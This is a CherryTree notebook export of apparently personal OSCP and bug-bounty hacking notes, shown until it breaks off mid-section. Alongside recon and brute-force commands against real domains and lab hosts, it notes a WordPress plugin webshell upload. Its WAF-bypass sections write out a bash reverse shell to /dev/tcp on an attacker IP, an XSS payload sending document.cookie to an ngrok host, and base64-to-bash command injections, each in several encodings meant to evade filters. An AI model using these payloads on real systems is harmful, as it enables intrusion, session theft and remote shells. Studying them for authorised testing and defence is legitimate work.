<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>164457_OSCP_Methodology.ctb</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><a name="Methdology_1.html"></a><h1 class='title level-1'>Methdology</h1><br/><p> </p></div><div class='page'><a name="Methdology--Enumeration_12.html"></a><h1 class='title level-2'>Enumeration</h1><br/><p>Learning resources: </p><p></p><p><span style="color:#3f4043;">Mainly WebApp and API Learning playlists:</span></p><p><a href="https://www.youtube.com/@CyberSecurityTV/playlists">https://www.youtube.com/@CyberSecurityTV/playlists</a></p><p><a href="https://www.youtube.com/@BePracticalTech/playlists">https://www.youtube.com/@BePracticalTech/playlists</a></p><p><a href="https://www.youtube.com/@AvoidingBigBrother/playlists">https://www.youtube.com/@AvoidingBigBrother/playlists</a></p><p><a href="https://www.youtube.com/@BUGXS/playlists">https://www.youtube.com/@BUGXS/playlists</a></p><p><a href="https://youtu.be/LfncgPeqsWU?list=PL0W_QjMcqdSAoIByaa1fe5sQEs0GqjSYe&t=109">https://youtu.be/LfncgPeqsWU?list=PL0W_QjMcqdSAoIByaa1fe5sQEs0GqjSYe&amp;t=109</a></p><p><a href="https://www.youtube.com/@xct_de/playlists">https://www.youtube.com/@xct_de/playlists</a></p><p><a href="https://www.youtube.com/watch?v=C1WVzMACFmA&list=PL7KK7fPcGxbYmVB4uhmOkIeeQzsmV0EfO">https://www.youtube.com/watch?v=C1WVzMACFmA&amp;list=PL7KK7fPcGxbYmVB4uhmOkIeeQzsmV0EfO</a></p><p><a href="https://www.youtube.com/playlist?list=PL7KK7fPcGxbYmVB4uhmOkIeeQzsmV0EfO">https://www.youtube.com/playlist?list=PL7KK7fPcGxbYmVB4uhmOkIeeQzsmV0EfO</a></p><p><a href="https://www.youtube.com/watch?v=UT7-ZVawdzA&list=PLNn-3NXkX6Esiawe2dp5s0ZC9Ua6pYfCc&index=6">https://www.youtube.com/watch?v=UT7-ZVawdzA&amp;list=PLNn-3NXkX6Esiawe2dp5s0ZC9Ua6pYfCc&amp;index=6</a></p><p></p><p><span style="color:#3f4043;">Mind maps:</span></p><p><a href="https://github.com/imran-parray/Mind-Maps">https://github.com/imran-parray/Mind-Maps</a></p><p><a href="https://media-exp1.licdn.com/dms/document/C561FAQFMUiAa5fYPhg/feedshare-document-pdf-analyzed/0/1649057128703?e=2147483647&v=beta&t=2MXCYdO_Lpeq1vXOFgwr4exZT-gw16kAhaGG9ZapsH4">https://media-exp1.licdn.com/dms/document/C561FAQFMUiAa5fYPhg/feedshare-document-pdf-analyzed/0/1649057128703?e=2147483647&amp;v=beta&amp;t=2MXCYdO_Lpeq1vXOFgwr4exZT-gw16kAhaGG9ZapsH4</a></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon_2.html"></a><h1 class='title level-3'>Initial Recon</h1><br/><p><strong><h3>Network Scanning:</h3></strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong>nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt &amp;&amp; sleep 5 &amp;&amp; nmap -Pn $target -sV -sC -v -oN nmap_sVsC.txt<strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong>nmap -p- -Pn $target -v --min-rate 1200 --max-rtt-timeout 800ms --max-retries 5 --open -oN nmap_ports.txt</p><p>nmap -Pn $target -sV -sC -v -T5 --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5</p><p>nmap -T5 -Pn $target -v --script vuln -oN nmap_vuln.txt </p><p>rustscan --ulimit 5000 -a $target -- -sC -sV -Pn -oN nmap_full</p><p></p><p><strong><h3>Web Content Discovery:</h3></strong> (do --hh 402  f.ex on the character count with wfuzz to filter it out or --hw 12 on words)</p><p>wfuzz -u <a href="http://$target/FUZZ">http://$target/FUZZ</a> --hc 404 -c -t 40 -w /usr/share/seclists/Discovery/Web-Content/common.txt</p><p>wfuzz -u <a href="http://$target/FUZZ">http://$target/FUZZ</a> --hc 404 -c -t 40 -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt</p><p>wfuzz -u <a href="http://$target/FUZZ">http://$target/FUZZ</a> --hc 404 -c -t 40 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt </p><p>wfuzz -u <a href="http://$target/FUZZ">http://$target/FUZZ</a> --hc 404 -c -t 40 -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt</p><p>katana -u <a href="http://127.0.0.1:80">http://127.0.0.1:80</a> -jc --depth 4 -silent</p><p></p><p>/usr/share/seclists/Discovery/Web-Content/common.txt</p><p>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</p><p>/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt</p><p>/usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt</p><p></p><p>/usr/share/seclists/Discovery/Web-Content/big.txt</p><p>/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt</p><p>/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt</p><p></p><p><a href="#Methdology--Privilege_Escalation_22.html">Privilege Escalation</a></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology_378.html"></a><h1 class='title level-4'>General methodology</h1><br/><p></p><p><a href="https://media-exp1.licdn.com/dms/document/C561FAQFMUiAa5fYPhg/feedshare-document-pdf-analyzed/0/1649057128703?e=2147483647&v=beta&t=2MXCYdO_Lpeq1vXOFgwr4exZT-gw16kAhaGG9ZapsH4">https://media-exp1.licdn.com/dms/document/C561FAQFMUiAa5fYPhg/feedshare-document-pdf-analyzed/0/1649057128703?e=2147483647&amp;v=beta&amp;t=2MXCYdO_Lpeq1vXOFgwr4exZT-gw16kAhaGG9ZapsH4</a></p><p><ul><li>Start Burp Suite and have it passively listening to requests</li><li>Check web server version and underlying host system</li><li>Any CMS? Check page, source code, check tabs, headers, cookies</li><li>Check network traffic on sites and see if they make any interesting calls to somewhere</li><li>Bruteforce directories, files, and maybe subdomains</li><li>Read sourcecode especially on main page, login pages, and .js files</li><li>Keep burp proxying in the background and look for redirects or pages not obvious for enduser</li><li>Keep an eye on paramaters used on any request -&gt; if so, test SQLI, Command Injection, LFI/RFI, XSS etc</li><li>Check for dumb shit like exposed .bak files etc</li></ul></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Checking_for_CVE's_and_misconfigrations_527.html"></a><h1 class='title level-5'>Checking for CVE's and misconfigrations</h1><br/><p>Use nuclei too:</p><p><a href="https://github.com/projectdiscovery/nuclei">https://github.com/projectdiscovery/nuclei</a></p><p></p><p><img src="images/527-1.png" alt="images/527-1.png" /></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Checking_for_CVE's_and_misconfigrations--Nuclei_541.html"></a><h1 class='title level-6'>Nuclei</h1><br/><p><a href="https://github.com/projectdiscovery/nuclei">https://github.com/projectdiscovery/nuclei</a></p><p>go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest</p><p></p><p>nuclei -u https://www.example.com -o nuclei.txt -H &#39;Cookie: __utma=3888939.1525145704.1681934326.1682325240.1682336033.7; __utmz=3888939.1682336033.7.3.utmcsr=burpsuite|utmccn=(referral)|utmcmd=referral|utmcct=/; optimizelyEndUserId=oeu1681934326465r0.21988294222220184; optimizelySegments=%7B%7D; optimizelyBuckets=%7B%7D; __utmc=3888939; __gads=ID=ee3e4f3ff600bee0-221dfa15abdd00d6:T=1682241482:RT=1682241482:S=ALNI_MZmEwEJmLePmDeB73-j6k6bkHYs2w; __gpi=UID=00000bee4645a8fe:T=1682241482:RT=1682325604:S=ALNI_MYw9Y650SP71kBJ43eC0sqwW865Mg; ASP.controls_findbusiness_ascx=1; __utmb=3888939.11.10.1682336033; __utmt=1&#39;  -t exposures/ -t cves/ -t vulnerabilities/ -t fuzzing/ -t misconfiguration/ -t technologies/</p><p></p><p></p><p><h3>This option attempts to fingerprint the technology stack and components used on the target, then select templates that have been tagged with those tech stack keywords. Example:</h3></p><p></p><p><code>nuclei </code><code><span style="color:#62b3ef;">-u</span></code><code> https://jira.targetdomain.site </code><code><span style="color:#62b3ef;">-s</span></code><code> critical,high,medium,low,info</code> <code> </code><code><span style="color:#62b3ef;">-as</span></code></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Checking_for_CVE's_and_misconfigrations--jaeles_579.html"></a><h1 class='title level-6'>jaeles</h1><br/><p><a href="https://github.com/jaeles-project/jaeles">https://github.com/jaeles-project/jaeles</a></p><p></p><p>GO111MODULE=on go get github.com/jaeles-project/jaeles</p><p>GO111MODULE=on go install github.com/jaeles-project/jaeles@latest</p><p></p><p></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Checking_for_CVE's_and_misconfigrations--Osmedeus_589.html"></a><h1 class='title level-6'>Osmedeus</h1><br/><p><a href="https://github.com/j3ssie/osmedeus">https://github.com/j3ssie/osmedeus</a></p><p></p><p><span style="color:#3f4043;">Directly run on vuln scan and directory scan on list of domains:</span></p><p>osmedeus scan -f vuln-and-dirb -t list-of-domains.txt</p><p></p><p><span style="color:#3f4043;">Scan list of targets:</span></p><p>osmedeus scan -T list_of_targets.txt</p><p></p><p><span style="color:#3f4043;">General scan:</span></p><p>osmedeus scan -f general -t tesla.com</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Checking_for_CVE's_and_misconfigrations--heartbleed_oneliner_588.html"></a><h1 class='title level-6'>heartbleed oneliner</h1><br/><p>cat subdomains.txt | while read line ; do echo &quot;QUIT&quot; | openssl s_client -connect $line:443 2&gt;&amp;1 | grep &#39;server extension &quot;heartbeat&quot; (id=15)&#39; || echo $line: safe; done</p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery_10.html"></a><h1 class='title level-5'>Content Discovery</h1><br/></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--IP_and_Port_Discovery_576.html"></a><h1 class='title level-6'>IP and Port Discovery</h1><br/></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--IP_and_Port_Discovery--ASN_538.html"></a><h1 class='title level-7'>ASN</h1><br/><p><span style="color:#3f4043;">ASN discovery:</span> <span style="color:#3f4043;">(Be careful with ASNs)</span></p><p><a href="https://bgp.he.net/">https://bgp.he.net/</a></p><p></p><p><span style="color:#3f4043;">Discover more seed domains with Amass:</span></p><p>amass intel -asn 46489</p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--IP_and_Port_Discovery--RustScan_580.html"></a><h1 class='title level-7'>RustScan</h1><br/><p><span style="color:#3f4043;">Fastest port scanner in the industry. Also works with hosts file:</span></p><p>rustscan -a tesla_subdomains.txt --ulimit 10000 -r 1-65535</p><p></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--IP_and_Port_Discovery--Naabu_577.html"></a><h1 class='title level-7'>Naabu</h1><br/><p><span style="color:#3f4043;">This will scan each subdomain for all potentially open tcp ports:</span></p><p>naabu -list tesla_subdomains.txt -p 0-65535</p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--IP_and_Port_Discovery--Subdomain_Discovery_534.html"></a><h1 class='title level-7'>Subdomain Discovery</h1><br/></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--IP_and_Port_Discovery--Subdomain_Discovery--subfinder_543.html"></a><h1 class='title level-8'>subfinder</h1><br/><p>subfinder -d tesla.com</p><p></p><p></p><p></p><p>subfinder -d edu.ee -all -v -o subs.txt</p><p></p><p>cat subs.txt | httpx -probe | grep -i SUCCESS | cut -d &#39;[&#39; -f1 | tee subs.alive</p><p></p><p>cat subs.alive | httpx -sc -title -ms &#39;login&#39; -td -cdn -server -p 22,80,443,500,3306,3389,8080,8443 -follow-redirects | tee httpx.log</p><p></p></div><div class='page'><a name="Enumeration--Initial_Recon--General_methodology--Content_Discovery--IP_and_Port_Discovery--Subdomain_Discovery--scraping_cloud-ranges_547.html"></a><h1 class='title level-8'>scraping cloud-ranges</h1><br/><p></p><p><span style="color:#3f4043;">Parses domain names in certificate data from the cloud</span></p><p><a href="https://youtu.be/p4JgIu1mceI?t=3267">https://youtu.be/p4JgIu1mceI?t=3267</a></p><p></p><p><a href="https://kaeferjaeger.gay/?dir=sni-ip-ranges">https://kaeferjaeger.gay/?dir=sni-ip-ranges</a></p><p></p><p></p><p></p><p>wget &#39;<a href="https://kaeferjaeger.gay/sni-ip-ranges/amazon/ipv4_merged_sni.txt'">https://kaeferjaeger.gay/sni-ip-ranges/amazon/ipv4_merged_sni.txt&#39;</a> &amp;&amp; wget &#39;<a href="https://kaeferjaeger.gay/sni-ip-ranges/digitalocean/ipv4_merged_sni.txt'">https://kaeferjaeger.gay/sni-ip-ranges/digitalocean/ipv4_merged_sni.txt&#39;</a> &amp;&amp; wget &#39;<a href="https://kaeferjaeger.gay/sni-ip-ranges/google/ipv4_merged_sni.txt'">https://kaeferjaeger.gay/sni-ip-ranges/google/ipv4_merged_sni.txt&#39;</a> &amp;&amp; wget &#39;<a href="https://kaeferjaeger.gay/sni-ip-ranges/microsoft/ipv4_merged_sni.txt'">https://kaeferjaeger.gay/sni-ip-ranges/microsoft/ipv4_merged_sni.txt&#39;</a> &amp;&amp; wget &#39;<a href="https://kaeferjaeger.gay/sni-ip-ranges/oracle/ipv4_merged_sni.txt'">https://kaeferjaeger.gay/sni-ip-ranges/oracle/ipv4_merged_sni.txt&#39;</a> &amp;&amp; cat ipv4* | cut -d &#39;[&#39; -f2 | cut -d &#39;]&#39; -f1 | sort | uniq | tr &#39; &#39; &#39;\n&#39; | grep -i &#39;tesla.com&#39; &gt; tesla_subdomains.txt</p><p></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--IP_and_Port_Discovery--Subdomain_Discovery--amass_544.html"></a><h1 class='title level-8'>amass</h1><br/><p>amass enum -active -brute -d tesla.com -o tesla_subdomains.txt</p><p></p></div><div class='page'><a name="-Enumeration--Initial_Recon--General_methodology--Content_Discovery--IP_and_Port_Discovery--Subdomain_Discovery--github-subdomains.py_545.html"></a><h1 class='title level-8'>github-subdomains.py</h1><br/><p><a href="https://github.com/gwen001/github-subdomains">https://github.com/gwen001/github-subdomains</a></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--IP_and_Port_Discovery--Subdomain_Discovery--shosubgo_546.html"></a><h1 class='title level-8'>shosubgo</h1><br/><p><a href="https://github.com/incogbyte/shosubgo">https://github.com/incogbyte/shosubgo</a></p><p></p><p><span style="color:#3f4043;">Finds subdomains through shodan</span></p><p></p><p></p><p>go install github.com/incogbyte/shosubgo@latest</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--IP_and_Port_Discovery--Subdomain_Discovery--lilly_610.html"></a><h1 class='title level-8'>lilly</h1><br/><p><a href="https://github.com/Dheerajmadhukar/Lilly">https://github.com/Dheerajmadhukar/Lilly</a></p></div><div class='page'><a name="dology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--IP_and_Port_Discovery--Probing,_resolving,_screenshotting_604.html"></a><h1 class='title level-7'>Probing, resolving, screenshotting</h1><br/></div><div class='page'><a name="Recon--General_methodology--Content_Discovery--IP_and_Port_Discovery--Probing,_resolving,_screenshotting--httprobe__check_alive_hosts_571.html"></a><h1 class='title level-8'>httprobe | check alive hosts</h1><br/><p><a href="https://github.com/tomnomnom/httprobe">https://github.com/tomnomnom/httprobe</a></p><p>go install github.com/tomnomnom/httprobe@latest</p><p></p><p>cat tesla_subdomains.txt | httprobe -p http:81 -p http:3000 -p https:3001 -p http:3001 -p https:3001 -p http:8000 -p http:8080 -p https:8443 -p http:8880 -p http:8888 -p http:9000 -p http:9001 -p http:9003 -c 50 | tee tesla_alive_domains.txt </p></div><div class='page'><a name="eration--Initial_Recon--General_methodology--Content_Discovery--IP_and_Port_Discovery--Probing,_resolving,_screenshotting--resolve_ip_600.html"></a><h1 class='title level-8'>resolve ip</h1><br/><p>amass -d enum tesla.com &gt; domains.txt &amp;&amp; awk &lt; domains.txt &#39;{ system(&quot;resolveip -s &quot;$1)&#39; &gt; ips.txt</p></div><div class='page'><a name="umeration--Initial_Recon--General_methodology--Content_Discovery--IP_and_Port_Discovery--Probing,_resolving,_screenshotting--aquatone_605.html"></a><h1 class='title level-8'>aquatone</h1><br/></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--Technology_Discovery_530.html"></a><h1 class='title level-6'>Technology Discovery</h1><br/><p><img src="images/530-1.png" alt="images/530-1.png" /> </p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--Technology_Discovery--httpx_572.html"></a><h1 class='title level-7'>httpx</h1><br/><p><a href="https://github.com/projectdiscovery/httpx">https://github.com/projectdiscovery/httpx</a></p><p>go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest</p><p></p><p>Feed it subdomains and it&#39;ll skim those and quickly find some technology stack it utilizes.</p><p></p><p>cat tesla_subdomains.txt | httpx -title -ip -tech-detect -status-code -web-server -o servers.txt | grep 200</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--Technology_Discovery--Wappalyzer_531.html"></a><h1 class='title level-7'>Wappalyzer</h1><br/><p>Web extension.</p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--Technology_Discovery--Whatweb_532.html"></a><h1 class='title level-7'>Whatweb</h1><br/><p><span style="color:#3f4043;">(Note that the _target_ variable is dynamically updates with the target list)</span></p><p>gedit commands.txt</p><p>whatweb _target_ &gt;&gt; uwu.txt</p><p></p><p>interlace -tL ./target -cL commands.txt -threads 5 -v    </p><p></p><p><span style="color:#3f4043;">The command above will run all the commands in commands.txt against all the targets in targets.txt. Everything will be multithreaded and the output will be sorted into separate text files within the ~/engagement folder.</span></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--Technology_Discovery--WhatRuns_533.html"></a><h1 class='title level-7'>WhatRuns</h1><br/><p>Web extension.</p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--Technology_Discovery--CMSmap_306.html"></a><h1 class='title level-7'>CMSmap</h1><br/><p>cd /opt</p><p></p><p>git clone <a href="https://github.com/dionach/CMSmap">https://github.com/dionach/CMSmap</a></p><p></p><p>git clone <a href="https://github.com/offensive-security/exploit-database">https://github.com/offensive-security/exploit-database</a></p><p></p><p>gedit /opt/CMSmap/cmsmap/cmsmap.conf </p><p></p><p></p><p>change preexisting info to this:</p><p></p><p>[exploitdb]</p><p>edbtype = GIT</p><p>edbpath = /opt/exploit-database</p><p></p><p>cd /opt/CMSmap</p><p></p><p>pip3 install .</p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--Technology_Discovery--CMS_and_Plugins_13.html"></a><h1 class='title level-7'>CMS and Plugins</h1><br/><p><span style="color:#3f4043;">Cms Discovery:</span></p><p>whatweb 10.10.77.213</p><p></p><p><span style="color:#3f4043;">whatcms could also do the trick, but whatweb is nice</span></p><p></p><p><span style="color:#3f4043;">pay attention to tabs, banners, icons, source code and URLs for CMS info. </span></p><p></p><p><span style="color:#3f4043;">When you get in joomla and wordpress should be easy reverse shells. Anything else look up exploits.</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">Pay attention to if you can add a user or if you could change configuration to be able to upload php etc..</span></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--Technology_Discovery--CMS_and_Plugins--Wordpress_159.html"></a><h1 class='title level-8'>Wordpress</h1><br/><p><span style="color:#3f4043;">Find usernames:</span></p><p><a href="https://www.wooda.co.uk/wp-json/wp/v2/users">https://www.wooda.co.uk/wp-json/wp/v2/users</a></p><p>wp-sitemap-users-1.xml</p><p></p><p><span style="color:#3f4043;">Good starting scan to find all:</span></p><p>wpscan --url <a href="http://10.3.3.34:9999">http://10.3.3.34:9999</a> -e vt,tt,u,ap</p><p></p><p><span style="color:#3f4043;">Might get you origin IP behind WAF if enabled. Use collaborator for callback.</span></p><p>https://www.target.com/xmlrpc.php</p><p></p><p><span style="color:#3f4043;">Bruteforcing: (this will identify users too) (don&#39;t trust this one always. Has failed for me before when hydra didn&#39;t. Run both.)</span></p><p>wpscan --url <a href="http://10.3.3.34:9999">http://10.3.3.34:9999</a> --passwords /usr/share/wordlists/rockyou.txt</p><p></p><p>wpscan --url <a href="http://10.3.3.34:9999">http://10.3.3.34:9999</a> -U userlist.txt --passwords /usr/share/wordlists/rockyou.txt</p><p></p><p><span style="color:#234141;">When you reach the actual webserver with a shell, make sure to check out:</span></p><p>/var/www/html/wordpress/wp-config.php</p><p><span style="color:#234141;">There&#39;s often database credentials in there.</span></p><p></p><p><span style="color:#3f4043;">http-post-form brute with hydra:</span></p><p>hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.11.1.251 https-post-form &#39;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:S=Location&#39; -V -e nsr -f -t 50</p><p></p><p><span style="color:#3f4043;">Proxychains</span>:</p><p>proxychains -q wpscan --url <a href="http://10.3.3.34:9999">http://10.3.3.34:9999</a> -e vt,tt,u,ap</p><p></p></div><div class='page'><a name="ology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--Technology_Discovery--CMS_and_Plugins--Wordpress--Exploits_410.html"></a><h1 class='title level-9'>Exploits</h1><br/></div><div class='page'><a name="Content_Discovery--Technology_Discovery--CMS_and_Plugins--Wordpress--Exploits--Plugin_Slideshow_Gallery_1.4.6_-_Arbitrary_File_Upload_411.html"></a><h1 class='title level-10'>Plugin Slideshow Gallery 1.4.6 - Arbitrary File Upload</h1><br/><p><a href="https://www.exploit-db.com/exploits/34514">https://www.exploit-db.com/exploits/34514</a></p><p></p><p><img src="images/411-1.png" alt="images/411-1.png" /></p><p></p><p>Just go to slideshow, managed slides. Edit a slide. Drop in a webshell and go to:</p><p><code>wp-content/uploads/slideshow-gallery/urshell.php</code></p><p></p><p>Might be in a different location slighty, or might have to do some upload bypass techniques but should be easy </p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--Technology_Discovery--WAF_537.html"></a><h1 class='title level-7'>WAF</h1><br/></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--Technology_Discovery--WAF--WAF_Providers_739.html"></a><h1 class='title level-8'>WAF Providers</h1><br/></div><div class='page'><a name="numeration--Initial_Recon--General_methodology--Content_Discovery--Technology_Discovery--WAF--WAF_Providers--Bunny_CDN_and_Jquery_CDN_740.html"></a><h1 class='title level-9'>Bunny CDN and Jquery CDN</h1><br/><p>https://www.example.com [Bootstrap:5.1.3,Font Awesome,Google Tag Manager,HTTP/3,LiteSpeed,PHP:5.6.40,YouTube]</p><p></p><p>Bunny CDN</p><p>jsDelivr</p><p>jQuery CDN</p><p></p><p></p><p><span style="color:#3f4043;">blocked characters:</span></p><p>onload</p><p>src</p><p>cookie</p><p>onclick</p><p>onerror</p><p>onstart</p><p>setTimeout</p><p>xlink</p><p>javascript</p><p>data</p><p>%</p><p></p><p></p><p><span style="color:#3f4043;">this got around, but got blocked by SOP:</span></p><p>&lt;embed+codebase%3d&quot;http%3a//4.tcp.eu.ngrok.io:18641/xss.swf%3fc%3d&#39;%2bdocument.domain%3b&quot;&gt;&lt;/embed&gt;</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--General_methodology--Content_Discovery--Technology_Discovery--WAF--WAF_Encoding_Techniques_585.html"></a><h1 class='title level-8'>WAF Encoding Techniques</h1><br/><p>bash -i &gt;&amp; /dev/tcp/10.13.12.42/443 0&gt;&amp;1</p><p></p><p><span style="color:#3f4043;">Url encoding:</span> (<a href="https://www.urlencoder.org/">https://www.urlencoder.org/</a>)</p><p>bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.13.12.42%2F443%200%3E%261</p><p>bash%2520-i%2520%253E%2526%2520%252Fdev%252Ftcp%252F10.13.12.42%252F443%25200%253E%25261</p><p></p><p></p><p><h3>Here are some other encoding techniques that can be used to bypass web application firewalls and other security measures:</h3><ol><li>URL encoding - This involves replacing special characters with their encoded equivalents, using the % character followed by the ASCII code in hexadecimal format. For example, %3C represents the &lt; character.</li></ol></p><p><ol><li>Double URL encoding - This involves encoding the already encoded characters again. For example, %3C becomes %253C.</li></ol></p><p><ol><li>Hexadecimal encoding - This involves representing characters using their ASCII codes in hexadecimal format. For example, the &lt; character is represented as 3C.</li></ol></p><p><ol><li>Decimal encoding - This involves representing characters using their ASCII codes in decimal format. For example, the &lt; character is represented as 60.</li></ol></p><p><ol><li>UTF-8 encoding - This involves representing characters using the UTF-8 character encoding scheme, which can represent any Unicode character. For example, the &lt; character is represented as %3C in UTF-8 encoding.</li></ol></p><p><ol><li>JavaScript encoding - This involves using the escape() or encodeURI() functions in JavaScript to encode characters. For example, the &lt; character is represented as %3C when using escape().</li></ol></p><p><ol><li>CSS encoding - This involves using the \ character followed by the ASCII code in hexadecimal format to represent characters in CSS. For example, \3C represents the &lt; character.</li></ol></p><p></p><p><h3>It&#39;s important to note that the effectiveness of these encoding techniques may depend on the specific WAF or security measures in place, and should be tested in a controlled environment before attempting to use them in a real-world scenario.</h3></p><p></p><p>OCTAL AND CHARSET TOO</p><p></p></div><div class='page'><a name="Enumeration--Initial_Recon--General_methodology--Content_Discovery--Technology_Discovery--WAF--WAF_Encoding_Techniques--html_entities_715.html"></a><h1 class='title level-9'>html entities</h1><br/><p><span style="color:#3f4043;">Normal:</span></p><p></p><p>&#39;;select sleep(5)-- -</p><p>&quot;) or &quot;1&quot;=&quot;1--</p><p>&quot; or sleep(5)=1--</p><p></p><p>&#39;;alert(&#39;xss&#39;);//</p><p>&lt;svg/onload=confirm(1)&gt;</p><p>&lt;script&gt;new Image().src = &quot;<a href="http://5.tcp.eu.ngrok.io:15257/cool.jpg?output=">http://5.tcp.eu.ngrok.io:15257/cool.jpg?output=</a>&quot; + document.cookie;&lt;/script&gt;</p><p></p><p>{</p><p>&quot;target&quot;:&quot;\&quot;;echo cGluZyAtYzIgMTAuMTMuNC4y | base64 -d | bash; \&quot;&quot;</p><p>}</p><p>&amp;&amp;`sleep 10`#</p><p>;echo cGluZyAtYzIgMTAuMTMuNC4y|base64 -d|bash;</p><p></p><p></p><p><span style="color:#3f4043;">html entities encoded:</span></p><p></p><p>&#39;;select sl&amp;#101;ep(5)-- -</p><p>&quot;) or &quot;&amp;#49; &amp;#61; &quot;&amp;#49;--</p><p>&quot; or sl&amp;#101;ep(5)=1--</p><p></p><p>&#39;;alert(&amp;#39;xss&amp;#39;);//</p><p>&amp;lt;svg/onload=&amp;#39;confirm(1)&amp;#39;&amp;gt;</p><p>&amp;lt;script&amp;gt;new Image().src &amp;#61; &amp;quot;<a href="http://5.tcp.eu.ngrok.io:15257/cool.jpg?output=&quot;">http://5.tcp.eu.ngrok.io:15257/cool.jpg?output=&amp;quot;</a> &amp;#43; document.cookie;&amp;lt;/script&amp;gt;</p><p></p><p>{</p><p>&amp;quot;target&amp;quot;:&amp;quot;&amp;quot;;echo cGluZyAtYzIgMTAuMTMuNC4y &amp;#124; base64 -d &amp;#124; bash; &amp;quot;&amp;quot;</p><p>}</p><p>&amp;#38;&amp;#38;`sl&amp;#101;ep 10`#</p><p>;echo cGluZyAtYzIgMTAuMTMuNC4y&amp;#124;base64 -d&amp;#124;bash;</p></div><div class='page'><a name="meration--Initial_Recon--General_methodology--Content_Discovery--Technology_Discovery--WAF--WAF_Encoding_Techniques--Unicode_encoding_716.html"></a><h1 class='title level-9'>Unicode encoding</h1><br/><p><span style="color:#3f4043;">Normal:</span></p><p></p><p>&#39;;select sleep(5)-- -</p><p>&quot;) or &quot;1&quot;=&quot;1--</p><p>&quot; or sleep(5)=1--</p><p></p><p>&#39;;alert(&#39;xss&#39;);//</p><p>&lt;svg/onload=confirm(1)&gt;</p><p>&lt;script&gt;new Image().src = &quot;<a href="http://5.tcp.eu.ngrok.io:15257/cool.jpg?output=">http://5.tcp.eu.ngrok.io:15257/cool.jpg?output=</a>&quot; + document.cookie;&lt;/script&gt;</p><p></p><p>{</p><p>&quot;target&quot;:&quot;\&quot;;echo cGluZyAtYzIgMTAuMTMuNC4y | base64 -d | bash; \&quot;&quot;</p><p>}</p><p>&amp;&amp;`sleep 10`#</p><p>;echo cGluZyAtYzIgMTAuMTMuNC4y|base64 -d|bash;</p><p></p><p></p><p><span style="color:#3f4043;">html entities 